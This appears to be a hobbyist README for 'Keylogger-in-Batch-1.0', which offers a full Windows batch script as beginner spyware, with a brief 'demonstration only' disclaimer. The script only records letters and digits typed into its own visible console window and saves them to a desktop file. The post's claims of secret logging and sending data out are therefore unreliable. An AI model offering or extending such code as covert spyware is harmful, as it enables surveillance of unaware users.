# Keylogger-in-Batch-1.0
A keylogger is a **basic spyware**, which logs the **key-presses** of the user secretly and saves it to a file in the background, then sends it to the required destination told in its **code**.

# MAKE A KEYLOGGER USING NOTEPAD | KEYLOGGER IN BATCH 1.0
A keylogger is a basic component of any **Spyware Hacking**. Anyone (from newbie to advanced) who hears about the term Hacking, and, wants to be a **hacker**, must come to know about a thing called a keylogger. And I’m sure that, if you are reading this article about this, then you know what it is and want to know how a **keylogger works in batch**?

Please bear note, we do not support Unethical Hacking, or malicious code at all. This is for demonstration purposes.

![Logfile at desktop](https://thebateam.files.wordpress.com/2018/12/2_2.png?w=600)

# WHAT IS A KEYLOGGER?
A keylogger is a basic spyware, which logs the key-presses of the user secretly and saves it to a file in the background, then sends it to the required destination told in its **code**.

However, there are some cases where a keylogger can be useful in less malicious ways. E.g such as system monitoring or inappropriate content **filtering**. Anyways, let’s jump in!

This is the first version of the **batch keylogger**, so it may have some serious limitations. But, with further increments and betterment in the method, we’ll launch the next versions of this **keylogger**.

```
:: This is the full Batch code for batch based 'keylogger'
:: you can simply copy and save it as
:: "keylogger ver.1.0.bat" OR You can download the Prepared
:: Batch file fom the Link At bottom of this Post ... :)

:: This keylogger is able to log all keys pressed...
:: [A-Z and a-z and 0-9]
:: but it can't log special characters...and 'Space' as 
:: they have special ASCII codes for them..

:: wait for ver. 2.0 to remove these limitations...
:: here ,it is the limitation of Batch ....#kvc
:: for any info. contact me 'karanveerchouhan@gmail.com'

:: MAIN CODE STARTS...

@echo off
cls
title Keylogger-Batch Ver. 1.0
set "list=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set entry=

:a
echo.
echo.
echo. Keylogger by Kvc
echo.&echo.Check the log file of pressed Keys in ur "desktop\keylogger.txt"
set a=
choice /n /c "%list%" /CS
set /a a=%errorlevel%-1

::creating temp. variables and checking which key is pressed....

set temp_list=%list%
set b=0

:loop
if "%b%" neq "%a%" (
set temp_list=%temp_list:~1%
set /a b=%b%+1
goto loop
)

set "entry=%entry%%temp_list:~0,1%"
echo.%entry%>"%userprofile%\desktop\keylogger.txt"
cls
echo.%entry%
goto a
```
[Read Full Article](https://www.thebateam.org/2018/12/keylogger-in-batch-v-1-0-by-kvc-keylogger-script-using-cmd/)
